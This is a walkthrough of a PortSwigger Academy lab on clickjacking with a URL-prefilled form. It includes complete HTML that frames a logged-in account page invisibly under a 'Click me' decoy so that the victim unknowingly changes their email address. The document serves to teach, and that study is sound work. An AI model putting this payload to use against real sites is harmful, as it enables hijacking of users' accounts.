
# #PortSwigger 


![[Pasted image 20260527132854.png]]


## Lab Description

> This lab extends the basic clickjacking example. The goal is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
> 
> **Objective:** Craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
> 
> **Credentials:** `wiener:peter`
> 
> **Note:** The victim will be using Chrome so test your exploit on that browser.  
> **Note:** You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---
---


## Step 1: Understanding the Vulnerability

**This lab extends basic clickjacking with:**
1. **URL parameter injection** — the email field can be prefilled via `?email=value`
2. **Clickjacking** — tricking the user into clicking the "Update email" button

**Why this works:**
- The account page accepts an `email` URL parameter to prefill the form
- No CSRF protection on the email update (or CSRF token is submitted with the click)
- The user is already authenticated
- We can frame the page and position a decoy over the "Update email" button

---

## Step 2: Reconnaissance

### Step 2.1: Log in to Your Account

1. Log in with credentials: `wiener:peter`
2. Go to **My account** page
![[Pasted image 20260527133044.png]]

### Step 2.2: Identify the Email Form

Look for the **Update email** form:
- Email input field
- "Update email" button

### Step 2.3: Test URL Parameter Injection

Check if the email field can be prefilled via URL parameter:
```
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker.com
```

**Expected result:** The email field is pre-filled with `hacker@attacker.com`

This allows us to set the email address to any value we want before the user clicks.

![[Pasted image 20260527133241.png]]

---

## Step 3: Crafting the Clickjacking Exploit

### Step 3.1: Basic HTML Template

```
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 1;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 2;
        cursor: pointer;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker.com"></iframe>
```

---

## Step 4: Positioning the Decoy

### Step 4.1: Initial Test with High Opacity

Start with `opacity: 0.1` so you can see both layers:
```
iframe {
    opacity: 0.1;  /* Start visible for alignment */
}
```

### Step 4.2: Align the Decoy

1. **Click View exploit**
2. **Hover over "Test me"**
3. If the cursor changes to a hand, you're over a clickable element
4. **Adjust `top` and `left` values** until the decoy is exactly over the "Update email" button


### Step 4.3: Fine-Tuning

If the button is not aligned:
- **Move down** --> increase `top`
- **Move up** --> decrease `top`
- **Move right** --> increase `left`
- **Move left** --> decrease `left`


---

## Step 5: Final Exploit Code

```
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.0001;
        z-index: 1;
    }
    div {
        position: absolute;
        top: 400px;
        left: 80px;
        z-index: 2;
        cursor: pointer;
    }
</style>

<div>Click me</div>

<iframe src="https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@malicious.com"></iframe>

```

Replace:
- `YOUR-LAB-ID` with your actual lab ID
- `hacker@malicious.com` with your chosen unique email address    
![[Pasted image 20260527133712.png]]

---

## Step 6: Testing the Exploit

1. **Store** the exploit
2. **View exploit** (be careful not to click!)
3. Hover over "Click me" - verify cursor changes to hand
4. If misaligned, adjust `top`/`left` and repeat 

**IMPORTANT:** Do NOT click the button yourself during testing. If you do, you'll change your own email address. Use a different email for final delivery.

---

## Step 7: Delivering to the Victim

1. Click **Deliver exploit to victim**
2. The victim sees "Click me" and clicks it
3. Underneath, they actually click the "Update email" button
4. The email address is changed to your specified value
5. Lab solved

---

## Step 8: Lab Solved

Success message displayed:

![[Pasted image 20260527133828.png]]

---
---
